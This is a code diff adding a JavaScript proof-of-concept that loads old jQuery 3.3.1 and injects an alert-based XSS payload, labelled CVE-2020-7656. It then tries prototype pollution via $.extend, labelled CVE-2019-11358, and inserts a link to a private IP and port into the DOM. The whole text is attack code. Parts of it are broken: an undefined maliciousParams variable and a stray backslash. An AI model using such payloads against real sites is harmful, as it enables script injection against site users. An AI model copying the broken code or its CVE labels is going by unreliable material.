@@ -1,0 +1,20 @@
+const script = document.createElement('script');
+script.src = "https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js";
+document.head.appendChild(script);
+script.onload = function() {
+    console.log("[+] Vulnerable jQuery loaded!");
+const maliciousContent = "<script>alert('XSS via CVE-2020-7656: ' + document.domain)</script >"; // Space after </script>
+    $('body').append(maliciousContent);
+    console.log("[+] XSS payload (CVE-2020-7656) injected. Alert will be displayed.");
+const defaultConfig = {
+        "backLink": "<a href='http://192.168.139.128:44444/'>Go Back</a>"
+    };
+let config = $.extend(true, defaultConfig, maliciousParams);
+    console.log("[+] Prototype Pollution executed via $.extend().");
+const container = document.createElement('div');
+    container.id = 'backLinkContainer';
+    document.body.appendChild(container);\
+$('#backLinkContainer').html(config.backLink);
+    console.log("[+] XSS payload (CVE-2019-11358) injected into the DOM. Alert will be displayed.");
+};
+console.log("[*] Script injected. Waiting for jQuery to load...");
